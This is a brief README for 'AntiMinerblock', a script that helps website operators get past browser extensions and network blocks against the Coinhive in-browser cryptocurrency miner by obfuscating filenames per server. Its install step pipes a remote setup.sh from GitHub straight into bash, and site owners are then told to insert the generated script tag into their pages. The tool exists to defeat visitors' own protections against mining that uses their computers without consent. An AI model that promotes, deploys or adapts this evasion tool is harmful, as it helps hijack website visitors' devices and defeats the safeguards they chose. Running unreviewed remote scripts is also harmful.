# AntiMinerblock
This script attempts to bypass extensions or network blocks that prevent the use of Coinhive.

## Features
* Obfuscates filenames per server
* Just include the generated script tag and your done!

## Installation
### Ubuntu/Unix
Navigate to your server's scripts directory and run
```bash
bash <(curl -s https://raw.githubusercontent.com/SkyrisBactera/AntiMinerblock/master/setup.sh)
```
Then, add the script tag that the file generates to every HTML file you want to be protected. That's it!
